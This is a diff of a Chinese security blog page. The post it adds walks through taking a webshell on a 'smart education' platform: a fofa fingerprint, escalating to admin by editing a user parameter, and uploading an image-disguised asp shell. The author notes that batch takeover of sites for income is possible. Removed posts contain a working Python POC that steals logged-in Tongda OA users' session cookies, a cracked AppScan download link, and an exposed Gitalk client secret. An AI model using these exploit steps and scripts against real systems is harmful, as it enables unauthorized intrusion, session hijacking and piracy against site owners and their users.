+    <a href="/2021/04/04/%E6%99%BA%E6%85%A7%E6%95%99%E8%82%B2%E8%B6%8A%E6%9D%83/" class="article-date">
+  <time datetime="2021-04-04T03:32:18.000Z" itemprop="datePublished">2021-04-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/04/%E6%99%BA%E6%85%A7%E6%95%99%E8%82%B2%E8%B6%8A%E6%9D%83/">智慧教育越权</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>智慧教育平台越权上传漏洞通杀拿webshell</p>
+<p>1.fofa语法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;Widget&#x2F;common&#x2F;Service&#x2F;CommonWidgetService.asmx&#x2F;Categorylist<br></code></pre></td></tr></table></figure>
+<p><img src="https://secquan.zzyuncheng.com/b45dd4d400209c3638d122a1689664f2.png-quanzi" alt="enter image description here"></p>
+<p>2.漏洞越权位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;SmartMobile&#x2F;MobileIndex.aspx?uname&#x3D;admin&amp;orgId&#x3D;0<br></code></pre></td></tr></table></figure>
+<p><img src="https://secquan.zzyuncheng.com/8c7fa5ccba628d2570e8967bc7d80dba.png-quanzi" alt="enter image description here"></p>
+<p>有的会提示输入账号密码，直接访问这个注册，就可以注册</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">Module&#x2F;SSO&#x2F;SJS_Register.aspx<br></code></pre></td></tr></table></figure>
+<p><img src="https://secquan.zzyuncheng.com/e79bc1f66d00183ce7d0cc1cc2b1d7b4.png-quanzi" alt="enter image description here"></p>
+<p>可以登录个人后台，<br><img src="https://secquan.zzyuncheng.com/cbbd3f0ee65ee9a3226ab45affe5dc85.png-quanzi" alt="enter image description here"></p>
+<p>3.登录后可以重普通用户越权到admin管理员用户</p>
+<p><img src="https://secquan.zzyuncheng.com/3f9876afdcb5edb7135b1643caac6eee.png-quanzi" alt="enter image description here"></p>
+<p>4.在个人页面抓包可以发现以get方式传输</p>
+<p><img src="https://secquan.zzyuncheng.com/aaf09447458aac4aee6897ea5c551823.png-quanzi" alt="enter image description here"></p>
+<p>试试有没有注入或者越权<br>就加个?id=123 ?user=miko<br>没有注入。。。。<br><img src="https://secquan.zzyuncheng.com/e4a0ed950e504bdeb458aba712df1e77.png-quanzi" alt="enter image description here"></p>
+<p>当把user换成admin时<br><img src="https://secquan.zzyuncheng.com/e41500af37b81850f9e187d0f58730b5.png-quanzi" alt="enter image description here"></p>
+<p>既然到了admin里面，这里应该有admin的cookie吧，于是直接又登录之前的越权漏洞地址，应该能到管理员后台</p>
+<p><img src="https://secquan.zzyuncheng.com/02b4709358740638d7f61379beaa94f6.png-quanzi" alt="enter image description here"></p>
+<p>5.成功了</p>
+<p><img src="https://secquan.zzyuncheng.com/275c8a049b4679c09d3e4c6d58f94594.png-quanzi" alt="enter image description here"></p>
+<p>6.找上传点<br>改filetype标签不行，加了个aspx，改了个aspx，还是不行，于是直接抓包，掏出burp<br><img src="https://secquan.zzyuncheng.com/067aed2d1c34bd797c34f17868d97bb9.png-quanzi" alt="enter image description here"></p>
+<p>7.传不了，图片可以传，但是aspx传的时候进度条不动，。。。。卡住了，于是做图片马<br>aspx加图片，哦呦，进去了，但是访问后报错<br><img src="https://secquan.zzyuncheng.com/ad709190630ab7761dfb1207a2721a99.png-quanzi" alt="enter image description here"></p>
+<p>于是找大佬问问，大佬也试了一下，大佬用的asp加图片，于是我也改asp加图片<br>嘿嘿</p>
+<p>8.成功拿下webshell</p>
+<p><img src="https://secquan.zzyuncheng.com/dd81b6f32ec5a748bb3ddbb2ae9f207f.png-quanzi" alt="enter image description here"></p>
+<p>目前发现这套模板可以写个批量拿站脚本，日收益会很不错，有些这个模板已经修复了，但是查找的高达90%都有这些漏洞。</p>
+<p>漏洞复现 | （通用0day）好视通视频会议平台存在任意文件下载漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&amp;mid=2247484986&amp;idx=1&amp;sn=55c43e01fb9cce6962272045c263fd83&amp;chksm=c07fbdcef70834d8869f57ebd926e4237fb4379b317ac7aaa271a68c20ce99a5b054c283c7df&amp;mpshare=1&amp;scene=23&amp;srcid=0404byavRK4wQ0q01VcNxxQ5&amp;sharer_sharetime=1617496800125&amp;sharer_shareid=f18a0e6ff07a610f239caab878f64be5#rd">https://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&amp;mid=2247484986&amp;idx=1&amp;sn=55c43e01fb9cce6962272045c263fd83&amp;chksm=c07fbdcef70834d8869f57ebd926e4237fb4379b317ac7aaa271a68c20ce99a5b054c283c7df&amp;mpshare=1&amp;scene=23&amp;srcid=0404byavRK4wQ0q01VcNxxQ5&amp;sharer_sharetime=1617496800125&amp;sharer_shareid=f18a0e6ff07a610f239caab878f64be5#rd</a></p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: 'a5bfaa7fddf1c19628f6',
+  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
+  repo: 'renzhonglin.github.io',
+  owner: 'renzhonglin',
+  admin: 'renzhonglin',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://bo.vuvhz.top/2021/04/04/%E6%99%BA%E6%85%A7%E6%95%99%E8%82%B2%E8%B6%8A%E6%9D%83/" data-id="ckn2m1hhd00009gcp6nt20loa" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-通达OA" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/03/23/%E9%80%9A%E8%BE%BEOA/" class="article-date">
@@ -465,334 +772,6 @@ gitalk.render('gitalk-container')
 
 
   
-    <article id="post-CVE-2021-21972" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/03/07/CVE-2021-21972/" class="article-date">
-  <time datetime="2021-03-07T13:56:13.000Z" itemprop="datePublished">2021-03-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/07/CVE-2021-21972/">CVE-2021-21972</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>#CVE-2021-21972 Vmware vCenter 图形化POC批量扫描工具<br>#工具界面：</p>
-<p><img src="https://secquan.zzyuncheng.com/372e9c3767d8cdd422e9b022dc40d5d3.png-quanzi" alt="enter image description here"></p>
-<p>（直接把.txt文件拖入进去就可以。。。）<br>###下载地址：<br><a target="_blank" rel="noopener" href="https://github.com/admin360bug/GUI-POC-EXP/#">https://github.com/admin360bug/GUI-POC-EXP/#</a><br>###关于EXP：<br>已编译完成，脱离python环境可用的工具<br><img src="https://secquan.zzyuncheng.com/67a5e99feb59ada76a80e353786c75b8.png-quanzi" alt="enter image description here"></p>
-<div id="gitalk-container"></div>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
-<script src="https://priesttomb.github.io/js/md5.min.js"></script>
-<script >
-var gitalk = new Gitalk({
-  clientID: 'a5bfaa7fddf1c19628f6',
-  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
-  repo: 'renzhonglin.github.io',
-  owner: 'renzhonglin',
-  admin: 'renzhonglin',
-  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
-  distractionFreeMode: false  // Facebook-like distraction free mode
-})
-gitalk.render('gitalk-container')
-</script>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://bo.vuvhz.top/2021/03/07/CVE-2021-21972/" data-id="ckmogaiis0005aacpci8ue7u7" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="通达OAv11.7在线用户登录漏洞-通达OA登录漏洞" class="article article-type-通达OAv11.7在线用户登录漏洞" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/03/07/%E9%80%9A%E8%BE%BEOA%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/" class="article-date">
-  <time datetime="2021-03-07T13:54:15.000Z" itemprop="datePublished">2021-03-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/07/%E9%80%9A%E8%BE%BEOA%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/">通达OAv11.7在线用户登录漏洞</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>#通达OA v11.7 在线用户登录漏洞<br>###漏洞描述<br>通达OA v11.7 中存在某接口查询在线用户，当用户在线时会返回 PHPSESSION使其可登录后台系统<br>###漏洞影响<br>通达OA &lt; v11.7</p>
-<p>###环境搭建<br><a target="_blank" rel="noopener" href="https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe">https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe</a><br>下载后按步骤安装即可<br>###漏洞复现<br>漏洞有关文件 MYOA\webroot\mobile\auth_mobi.php</p>
-<pre>
-<?php
-
-function relogin()
-{
-    echo _('RELOGIN');
-    exit;
-}
-ob_start();
-include_once 'inc/session.php';
-include_once 'inc/conn.php';
-include_once 'inc/utility.php';
-if ($isAvatar == '1' && $uid != '' && $P_VER != '') {
-    $sql = 'SELECT SID FROM user_online WHERE UID = \'' . $uid . '\' and CLIENT = \'' . $P_VER . '\'';
-    $cursor = exequery(TD::conn(), $sql);
-    if ($row = mysql_fetch_array($cursor)) {
-        $P = $row['SID'];
-    }
-}
-if ($P == '') {
-    $P = $_COOKIE['PHPSESSID'];
-    if ($P == '') {
-        relogin();
-        exit;
-    }
-}
-if (preg_match('/[^a-z0-9;]+/i', $P)) {
-    echo _('非法参数');
-    exit;
-}
-if (strpos($P, ';') !== false) {
-    $MY_ARRAY = explode(';', $P);
-    $P = trim($MY_ARRAY[1]);
-}
-session_id($P);
-session_start();
-session_write_close();
-if ($_SESSION['LOGIN_USER_ID'] == '' || $_SESSION['LOGIN_UID'] == '') {
-    relogin();
-}
-
-</pre>
-
-<p>在执行的 SQL语句中</p>
-<pre>
-$sql = 'SELECT SID FROM user_online WHERE UID = \'' . $uid . '\' and CLIENT = \'' . $P_VER . '\'';
-</pre>
-
-<p><img src="https://secquan.zzyuncheng.com/d8eb572842b6fd6850e1509fd8633117.png-quanzi" alt="enter image description here"></p>
-<p>简单阅读PHP源码可以知道 此SQL语句会查询用户是否在线，如在线返回此用户 Session ID</p>
-<p><img src="https://secquan.zzyuncheng.com/79bd0e09ddbcdd8284b73f61843ddbb5.png-quanzi" alt="enter image description here"></p>
-<p>将返回的 Set-Cookie 中的Cookie参数值使用于登录Cookie</p>
-<p>访问目标后台 <a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx/general/">http://xxx.xxx.xxx.xxx/general/</a></p>
-<p><img src="https://secquan.zzyuncheng.com/8037005f77edcd7efaa6f6ff14079cad.png-quanzi" alt="enter image description here"></p>
-<p>当目标离线时则访问漏洞页面则会出现如下图</p>
-<p><img src="https://secquan.zzyuncheng.com/e22feccb1e36f1ea9ecb8f6ab71b4154.png-quanzi" alt="enter image description here"><br>通过此思路可以持续发包监控此页面来获取在线用户的Cookie</p>
-<p>###漏洞利用POC<br>5秒一次测试用户是否在线</p>
-<pre>
-import requests
-import sys
-import random
-import re
-import time
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-
-def title():
-    print('+------------------------------------------')
-    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
-    print('+  \033[34mVersion: 通达OA 11.7                                               \033[0m')
-    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
-    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
-    print('+------------------------------------------')
-
-def POC_1(target_url):
-    vuln_url = target_url + "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
-    }
-    try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
-        if "RELOGIN" in response.text and response.status_code == 200:
-            print("\033[31m[x] 目标用户为下线状态 --- {}\033[0m".format(time.asctime( time.localtime(time.time()))))
-        elif response.status_code == 200 and response.text == "":
-            PHPSESSION = re.findall(r'PHPSESSID=(.*?);', str(response.headers))
-            print("\033[32m[o] 用户上线 PHPSESSION: {} --- {}\033[0m".format(PHPSESSION[0] ,time.asctime(time.localtime(time.time()))))
-        else:
-            print("\033[31m[x] 请求失败，目标可能不存在漏洞")
-            sys.exit(0)
-    except Exception as e:
-        print("\033[31m[x] 请求失败 \033[0m", e)
-
-if __name__ == '__main__':
-    title()
-    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
-    while True:
-        POC_1(target_url)
-        time.sleep(5)
-
-</pre>
-
-<p><img src="https://secquan.zzyuncheng.com/e4869ec095aec3c2d5df64cb968055a6.png-quanzi" alt="enter image description here"></p>
-<div id="gitalk-container"></div>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
-<script src="https://priesttomb.github.io/js/md5.min.js"></script>
-<script >
-var gitalk = new Gitalk({
-  clientID: 'a5bfaa7fddf1c19628f6',
-  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
-  repo: 'renzhonglin.github.io',
-  owner: 'renzhonglin',
-  admin: 'renzhonglin',
-  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
-  distractionFreeMode: false  // Facebook-like distraction free mode
-})
-gitalk.render('gitalk-container')
-</script>
-
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://bo.vuvhz.top/2021/03/07/%E9%80%9A%E8%BE%BEOA%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/" data-id="ckmogaiiz000eaacp8m1r08y1" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Appscan-10-0-4破解版" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/03/07/Appscan-10-0-4%E7%A0%B4%E8%A7%A3%E7%89%88/" class="article-date">
-  <time datetime="2021-03-07T13:47:41.000Z" itemprop="datePublished">2021-03-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/07/Appscan-10-0-4%E7%A0%B4%E8%A7%A3%E7%89%88/">Appscan_10.0.4破解版</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>#AppScan_10.0.4破解版<br><img src="https://secquan.zzyuncheng.com/218a1034bd504945b8b17c1abe4dd68e.png-quanzi" alt="enter image description here"></p>
-<p><img src="https://secquan.zzyuncheng.com/ea06c78478c8ba634ecc19ceb3b813fd.png-quanzi" alt="enter image description here"></p>
-<p><img src="https://secquan.zzyuncheng.com/d94ba970056c21ce3472870dc90c2b5f.png-quanzi" alt="enter image description here"></p>
-<p>链接：链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1RarULLWDgijG3E1_KKMUBw">https://pan.baidu.com/s/1RarULLWDgijG3E1_KKMUBw</a><br>提取码：53g8</p>
-<div id="gitalk-container"></div>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
-<script src="https://priesttomb.github.io/js/md5.min.js"></script>
-<script >
-var gitalk = new Gitalk({
-  clientID: 'a5bfaa7fddf1c19628f6',
-  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
-  repo: 'renzhonglin.github.io',
-  owner: 'renzhonglin',
-  admin: 'renzhonglin',
-  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
-  distractionFreeMode: false  // Facebook-like distraction free mode
-})
-gitalk.render('gitalk-container')
-</script>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://bo.vuvhz.top/2021/03/07/Appscan-10-0-4%E7%A0%B4%E8%A7%A3%E7%89%88/" data-id="ckmogaiik0000aacp484u40t0" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-foha" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/01/30/foha/" class="article-date">
-  <time datetime="2021-01-30T09:05:49.000Z" itemprop="datePublished">2021-01-30</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/30/foha/">foha批量查询脚本</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>#分享一下fofa的批量查询脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs plain">#!&#x2F;usr&#x2F;bin&#x2F;python3<br># -*- coding: utf-8 -*-<br># Author  : 诚默<br><br>import base64<br>import json<br>import time<br>import pandas as pd<br>import requests<br>fofa_mail &#x3D; &#39;&#39;#通过fofa个人资料中获取<br>fofa_key &#x3D; &#39;&#39;#<br>fofa_list &#x3D; [&#39;title&#39;, &#39;header&#39;, &#39;body&#39;, &#39;domain&#39;, &#39;icon_hash&#39;, &#39;host&#39;, &#39;port&#39;, &#39;ip&#39;, &#39;status_code&#39;, &#39;protocol&#39;, &#39;city&#39;,<br>             &#39;region&#39;, &#39;country&#39;, &#39;cert&#39;, &#39;banner&#39;, &#39;typ&#39;, &#39;os&#39;, &#39;server&#39;, &#39;app&#39;, &#39;after&#39;, &#39;asn&#39;, &#39;org&#39;,<br>             &#39;base_protocol&#39;,<br>             &#39;is_ipv6&#39;, &#39;is_domain&#39;, &#39;ip_ports&#39;, &#39;port_size&#39;, &#39;port_size_gt&#39;, &#39;port_size_lt&#39;, &#39;ip_country&#39;, &#39;ip_region&#39;,<br>             &#39;ip_city&#39;, &#39;ip_after&#39;, &#39;ip_before&#39;<br>             ]<br><br>def fofaapi(select):  # 进行调用<br>    page &#x3D; 1  # 爬取几页数据，size为每页个数<br>    size &#x3D; 10  # 高级会员最大爬取前10000个<br>    fields &#x3D; &quot;host,ip,port,title,country_name&quot;  # 返回的数据列<br>    full &#x3D; &#39;false&#39;  # 显示所有的数据，false显示当年的<br>    base64_str &#x3D; base64.b64encode(select.encode(&quot;utf-8&quot;)).decode(&#39;utf-8&#39;)<br>    api_url &#x3D; &#39;https:&#x2F;&#x2F;fofa.so&#x2F;api&#x2F;v1&#x2F;search&#x2F;all?email&#x3D;&#39; + fofa_mail + &#39;&amp;key&#x3D;&#39; + fofa_key + &#39;&amp;qbase64&#x3D;&#39; + base64_str + &#39;&amp;fields&#x3D;&#39; + fields + &#39;&amp;size&#x3D;&#39; + str(<br>        size) + &#39;&amp;page&#x3D;&#39; + str(page) + &#39;&amp;full&#x3D;&#39; + full<br>    r &#x3D; requests.get(api_url)  # 提交请求<br>    text &#x3D; json.loads(r.text.encode(&#39;gbk&#39;, &#39;ignore&#39;).decode(&#39;gbk&#39;))  # 获得dict数据<br>    print(text)<br><br>    # 后续为写入表<br>    columns &#x3D; fields.split(&#39;,&#39;)  # 数据列名<br>    excel_list &#x3D; text[&#39;results&#39;]<br>    excel_list.insert(0, [&quot;查询语句：&quot; + str(select) + &quot; 页数：&quot; + str(page) + &quot; 每页：&quot; + str(size)])  # 写入初始的查询语句<br>    dt &#x3D; pd.DataFrame(excel_list, columns&#x3D;columns)<br>    file &#x3D; &#39;fofa&#39; + time.strftime(&#39;%Y%m%d%H%M%S&#39;, time.localtime(time.time()))  # 文件名为fofa+时间<br>    dt.to_excel(file + &quot;.xlsx&quot;, index&#x3D;1, engine&#x3D;&#39;xlsxwriter&#39;)<br>    #return text<br><br>def getselect(str):#格式化<br>    select &#x3D; &quot;&quot;<br>    comma_list &#x3D; str.split(&#39;,&#39;)  # 以逗号分组 （ip&#x3D;1.1.1.1 | domain&#x3D;baidu.com）<br>    for item in comma_list:<br>        equal_list &#x3D; item.split(&#39;&#x3D;&#39;)  # 等号分组 ip | 1.1.1.1<br>        if equal_list[0] in fofa_list:  # 属性存在，等号合规<br>            select +&#x3D; item + &quot; &amp;&amp; &quot;<br>        else:<br>            return False<br>    return select.rstrip(&#39; &amp;&amp; &#39;)  # 去除多余符号<br><br>def main():<br>    str &#x3D; &quot;domain&#x3D;baidu.com&quot;<br>    str1 &#x3D; &quot;ip&#x3D;61.135.186.217,domain&#x3D;baidu.com&quot;<br><br>    if getselect(str1) !&#x3D; False:  # 进行数据处理，数据合规就进行下一步操作<br>        fofaapi(getselect(str1))<br><br>if __name__ &#x3D;&#x3D; &#39;__main__&#39;:<br>    main()<br></code></pre></td></tr></table></figure>
-
-<p>文件结果如下，可根据需求改动</p>
-<p><img src="https://secquan.zzyuncheng.com/0af6daa12bfe973d7c6d797eadc02bb3.png-quanzi" alt="enter image description here"></p>
-<div id="gitalk-container"></div>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
-<script src="https://priesttomb.github.io/js/md5.min.js"></script>
-<script >
-var gitalk = new Gitalk({
-  clientID: 'a5bfaa7fddf1c19628f6',
-  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
-  repo: 'renzhonglin.github.io',
-  owner: 'renzhonglin',
-  admin: 'renzhonglin',
-  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
-  distractionFreeMode: false  // Facebook-like distraction free mode
-})
-gitalk.render('gitalk-container')
-</script>
-
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://bo.vuvhz.top/2021/01/30/foha/" data-id="ckmogaiiv0009aacp8d8ycykq" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -829,23 +808,23 @@ gitalk.render('gitalk-container')
       <ul>
         
           <li>
+            <a href="/2022/11/29/anydesk%E8%BF%9B%E8%A1%8C%E8%BF%9C%E6%8E%A7/">anydesk进行远控</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/29/Struts2%E6%BC%8F%E6%B4%9E/">Struts2漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/29/wifi%E6%9D%80%E6%89%8B%E7%BB%88%E6%9E%81%E7%89%88oled%E6%98%BE%E7%A4%BA/">wifi杀手终极版oled显示</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/29/c%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80%E5%8A%A0%E8%BD%BD%E5%99%A8/">c语言免杀加载器</a>
+          </li>
+        
+          <li>
             <a href="/2022/11/28/%E6%A0%A1%E5%9B%AD%E7%83%AD%E6%B0%B4%E5%8D%A1%E7%A0%B4%E8%A7%A3/">校园热水卡破解.md</a>
-          </li>
-        
-          <li>
-            <a href="/2022/11/27/%E5%AE%89%E5%8D%93%E8%BF%9C%E6%8E%A7/">安卓远控.md</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/12/%E6%A0%A1%E5%9B%AD%E7%BD%91udp53%E7%AB%AF%E5%8F%A3%E7%A0%B4%E8%A7%A3%E5%85%8D%E8%AE%A4%E8%AF%81/">校园网udp53端口破解免认证</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/17/MFC%E7%A4%BE%E5%B7%A5%E5%88%A9%E5%99%A8/">MFC社工利器</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/17/esp8266+blinker%E7%9A%84app+%E5%B0%8F%E7%88%B1%E5%90%8C%E5%AD%A6%E6%8E%A7%E5%88%B64%E5%88%B08%E4%B8%AA%E8%AE%BE%E5%A4%87%E6%BA%90%E7%A0%81/">esp8266+blinker+小爱同学控制4到8个设备源码</a>
           </li>
         
       </ul>
